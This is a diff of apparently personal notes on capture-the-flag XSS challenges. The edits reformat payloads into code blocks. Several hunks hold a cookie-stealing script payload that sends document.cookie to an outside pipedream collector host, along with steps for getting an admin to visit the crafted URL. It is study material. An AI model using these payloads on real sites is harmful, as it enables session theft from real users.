@@ -23,9 +23,10 @@ var i = new Image();
 5. VPS or requestbin - https://public.requestbin.com/r/
 
 6. XSS
-   [Common XSS Errors[(https://github.com/imnarendrabhati/testing-new/blob/master/%3CIMG%20SRC%3DX%20ONERROR:JAVASCRIPT:ALERT(1)%3B%3E)
+   [Common XSS Errors](https://github.com/imnarendrabhati/testing-new/blob/master/%3CIMG%20SRC%3DX%20ONERROR:JAVASCRIPT:ALERT(1)%3B%3E)
 
-1) CTF XSS 1 (https://portswigger.net/web-security/cross-site-scripting/contexts)
+1) CTF XSS 1
+- [Similiar Example](https://portswigger.net/web-security/cross-site-scripting/contexts)
 - Error = Input script
 - Annoucement and create content "<script>alert(1)</script>" on the subject.
 - When you click it, the alert shows up.
@@ -73,8 +74,14 @@ xss');var cookieData = document.cookie; var i = new Image();i.src = "http://enjt
 b. CTF XSS 3
   - Error = Showing ID on the URL on the personal information 
   - Check the attack possibility to change the ID on Burp Suite Request
-  - Check the attack statement => aaa"/><script>alert(1)</script>
-  - Check the attack => aaa"/><script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
+  - Check the attack statement
+```javascript
+aaa"/><script>alert(1)</script>
+```
+  - Check the attack
+```javascript
+aaa"/><script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
+```
   - Copy GET URL and input the URL on the admin visit bar
   - Check the flag on https://public.requestbin.com/
 
